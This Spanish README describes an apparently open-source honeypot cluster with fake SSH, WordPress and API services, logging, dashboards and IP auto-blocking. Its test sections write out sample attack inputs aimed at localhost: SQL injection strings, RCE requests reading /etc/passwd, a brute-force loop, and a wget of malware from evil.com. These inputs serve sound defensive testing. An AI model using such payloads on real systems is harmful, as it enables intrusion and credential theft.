# 🎭 R'lyeh Honeypot

**CIUDAD SUMERGIDA - HONEYPOT DISTRIBUIDO**

> *"Ph'nglui mglw'nafh R'lyeh wgah'nagl fhtagn"
> In his house at R'lyeh dead Cthulhu waits dreaming*

## 📋 Descripción

Sistema de **honeypot distribuido** que simula servicios vulnerables para:
- 🎯 Atrapar atacantes antes de que dañen producción
- 🔍 Recolectar **IOCs reales** (Indicadores de Compromiso)
- 📊 Entender **TTPs** de atacantes (Tácticas, Técnicas, Procedimientos)
- 🔒 Integrarse con **Security-Enforcer** para bloqueo automático

## 🏗️ Arquitectura

```
┌─────────────────────────────────────────────────────────────────────┐
│                        R'LYEH HONEYPOT CLUSTER                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  🎭 SSH Honeypot      🌐 Web Honeypot       📡 API Honeypot      │
│  (Puerto 2222)       (Puerto 8080)         (Puerto 3000)         │
│       │                    │                      │                 │
│       └────────────────────┼──────────────────────┘                 │
│                            ↓                                        │
│                    ┌──────────────┐                                │
│                    │  Logstash    │                                │
│                    │  (Parser)     │                                │
│                    └──────┬───────┘                                │
│                            ↓                                        │
│                    ┌──────────────┐                                │
│                    │Elasticsearch│                                │
│                    │  (Storage)   │                                │
│                    └──────┬───────┘                                │
│                            ↓                                        │
│       ┌────────────────────┼──────────────────────┐                │
│       ▼                    ▼                      ▼                 │
│  ┌──────────┐      ┌──────────┐          ┌──────────┐            │
│  │ Kibana   │      │ R'lyeh   │          │ Security │            │
│  │Dashboard │      │ API      │          │ Enforcer │            │
│  └──────────┘      └──────────┘          └──────────┘            │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

## 🚀 Quick Start

### Requisitos
- Docker & Docker Compose
- 4GB RAM mínimo
- Puertos 2222, 8080, 8000, 5601 disponibles

### Iniciar

```bash
# Clonar
git clone https://github.com/rhizor/rlyeh.git
cd rlyeh

# Iniciar cluster
docker-compose up -d

# Verificar estado
docker-compose ps

# Ver logs
./scripts/watch.sh
```

### Acceder

| Servicio | URL | Descripción |
|----------|-----|-------------|
| SSH Honeypot | `ssh -p 2222 root@localhost` | Simula SSH vulnerable |
| Web Honeypot | http://localhost:8080 | Fake WordPress |
| R'lyeh API | http://localhost:8000/docs | API REST |
| Kibana | http://localhost:5601 | Dashboard |

## 🎯 Honeypots

### 🎭 SSH Honeypot (Puerto 2222)

Simula servidor SSH vulnerable:

```bash
# Conectar como atacante
ssh -p 2222 root@localhost

# Credenciales que "funcionan":
# root:root, root:admin, root:password
# admin:admin, user:user, test:test
```

**Registra:**
- ✅ IPs de origen
- ✅ Credenciales intentadas
- ✅ Comandos ejecutados
- ✅ Archivos descargados (malware)
- ✅ Sesiones completas

### 🌐 Web Honeypot (Puerto 8080)

Simula aplicaciones web vulnerables:

```bash
# Visitar WordPress falso
curl http://localhost:8080

# Intentar SQL injection
curl "http://localhost:8080/search?q=' UNION SELECT * FROM users--"

# Fake admin panel
curl http://localhost:8080/wp-admin/

# Fake phpMyAdmin
curl http://localhost:8080/phpmyadmin/

# Fake API vulnerable
curl -X POST http://localhost:8080/api/execute -d "cmd=whoami"
```

**Endpoints vulnerables:**
- `/` - WordPress homepage falso
- `/wp-login.php` - Login falso (registra credenciales)
- `/wp-admin/` - Admin panel (redirige a login)
- `/phpmyadmin/` - phpMyAdmin falso
- `/api/admin` - Endpoint admin (401)
- `/api/users/{id}` - IDOR vulnerability test
- `/api/execute` - RCE honeypot
- `/search?q=` - SQL injection test

## 📊 API Endpoints

### `/api/attacks`
Lista todos los ataques detectados

```bash
curl http://localhost:8000/api/attacks
```

### `/api/attacks/{honeypot}`
Ataques por tipo de honeypot

```bash
curl http://localhost:8000/api/attacks/ssh
curl http://localhost:8000/api/attacks/web
```

### `/api/iocs`
Extrae IOCs (IPs, credenciales, etc.)

```bash
curl http://localhost:8000/api/iocs
curl http://localhost:8000/api/iocs?format=csv
```

### `/api/stats`
Estadísticas del cluster

```bash
curl http://localhost:8000/api/stats
```

### `/api/block/{ip}`
Bloquear IP manualmente (integra con Security-Enforcer)

```bash
curl -X POST http://localhost:8000/api/block/1.2.3.4
```

## 🔒 Integraciones

### Security-Enforcer

Auto-bloqueo de IPs maliciosas:

```python
# Configurar en rlyeh-api
BLOCK_THRESHOLD = 5  # Bloquear después de 5 intentos fallidos
AUTO_BLOCK = True

# Cuando un atacante intenta 5 credenciales incorrectas:
# 1. R'lyeh detecta
# 2. Envía IP a Security-Enforcer
# 3. Security-Enforcer agrega regla de firewall
# 4. IP bloqueada en toda la red
```

### Azathoth-TI

Enriquecimiento de threat intelligence:

```python
# IPs detectadas en R'lyeh se envían a Azathoth
# Azathoth verifica si son conocidas maliciosas
# Si son nuevas, se agregan a la base de datos
```

### Providence-SOC

Alertas al SOC:

```yaml
# webhook_config.yaml
webhooks:
  providence-soc:
    url: "https://providence-soc.example.com/webhooks/rlyeh"
    events:
      - high_volume_attack
      - successful_compromise
      - new_malware_downloaded
```

## 📈 Dashboards

### Kibana (Puerto 5601)

Pre-configurado con:
- Mapa geográfico de atacantes
- Timeline de incidentes
- Top atacantes (IPs, países)
- Tipos de ataques

### R'lyeh Dashboard (Puerto 8000/dashboard)

Dashboard propio con:
- Estadísticas en tiempo real
- Lista de ataques recientes
- Export de IOCs
- Gestión de bloqueos

## 🔧 Configuración

### `config/rlyeh.yaml`

```yaml
rlyeh:
  cluster_name: "rlyeh-prod"
  
  honeypots:
    ssh:
      enabled: true
      port: 2222
      external_port: 22
      fake_accounts:
        root: ["root", "admin", "password", "123456"]
        admin: ["admin", "password"]
      
    web:
      enabled: true
      port: 8080
      external_port: 80
      endpoints:
        - wordpress
        - phpmyadmin
        - api_vulnerable
  
  security:
    auto_block: true
    block_threshold: 5
    block_duration: 86400  # 24 horas
    
  integrations:
    security_enforcer:
      enabled: true
      url: "http://security-enforcer:8080"
      api_key: "${SECURITY_ENFORCER_API_KEY}"
      
    azathoth_ti:
      enabled: true
      url: "http://azathoth-ti:3000"
      
    providence_soc:
      enabled: true
      webhook: "${PROVIDENCE_SOC_WEBHOOK}"
  
  alerting:
    slack:
      enabled: true
      webhook: "${SLACK_WEBHOOK}"
      
    telegram:
      enabled: true
      token: "${TELEGRAM_TOKEN}"
      chat_id: "${TELEGRAM_CHAT_ID}"
```

## 🛡️ Seguridad del Honeypot

### Contención

```yaml
# docker-compose.yml - Configuración segura
services:
  rlyeh-ssh:
    networks:
      - rlyeh-internal  # Aislado de producción
    sysctls:
      - net.ipv4.conf.all.route_localnet=1
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    read_only: true
    tmpfs:
      - /tmp:noexec,nosuid,size=100m
```

### Monitoreo

- Si un honeypot consume >50% CPU: **kill automático**
- Si hay >1000 conexiones/minuto: **rate limiting**
- Alertas en tiempo real a SOC

## 📊 Métricas

### KPIs Recomendados

| Métrica | Target |
|---------|--------|
| **Ataques/día** | >100 (indica exposición) |
| **IPs únicas** | Track geograficamente |
| **Credenciales intentadas** | Top passwords/usernames |
| **Malware recolectado** | Análisis forense |
| **IPs bloqueadas automáticamente** | Efectividad |

## 🧪 Testing

### Simular ataque SSH

```bash
# Terminal 1 - Iniciar honeypot
./scripts/start.sh

# Terminal 2 - Simular atacante
ssh -p 2222 root@localhost
# Password: root
# Verás un shell falso!

# Ejecutar comandos
whoami  # → root
ls -la   # → fake files
cat /etc/passwd  # → fake passwd
wget http://evil.com/malware.sh  # → detectado!
```

### Simular ataque Web

```bash
# SQL Injection
curl "http://localhost:8080/search?q=' OR 1=1 --"

# RCE
curl -X POST http://localhost:8080/api/execute \
  -H "Content-Type: application/json" \
  -d '{"cmd": "cat /etc/passwd"}'

# WordPress brute force
for pass in admin password 123456; do
  curl -X POST http://localhost:8080/wp-login.php \
    -d "log=admin&pwd=$pass"
done
```

## 📚 Roadmap

### Fase 1 (MVP) ✅
- [x] SSH Honeypot
- [x] Web Honeypot
- [x] Docker Compose
- [x] Elasticsearch storage
- [x] Basic API

### Fase 2 (Integration)
- [ ] Security-Enforcer integration
- [ ] Azathoth-TI enrichment
- [ ] Slack/Telegram alerts
- [ ] Auto-blocking

### Fase 3 (Advanced)
- [ ] Cowrie full integration
- [ ] Dionaea web honeypot
- [ ] Malware sandboxing
- [ ] Machine learning detection

### Fase 4 (Enterprise)
- [ ] Distributed honeypot grid
- [ ] Advanced forensics
- [ ] Threat intelligence sharing
- [ ] Custom honeypot modules

## 🤝 Contribuciones

¡Contribuciones bienvenidas!
- Nuevos honeypot modules
- Mejores fake services
- Integraciones adicionales
- Documentación

## 📖 Recursos

- [Cowrie GitHub](https://github.com/cowrie/cowrie)
- [Dionaea Web Honeypot](https://github.com/DinoTools/dionaea)
- [Elasticsearch](https://www.elastic.co/)
- [Honeynet Project](https://www.honeynet.org/)

---

**Versión:** 1.0.0  
**Autor:** rhizor  
**Licencia:** MIT  
**Cthulhu Fhtagn!** 🦑

**¡R'lyeh está despierta y espera!** 🎭
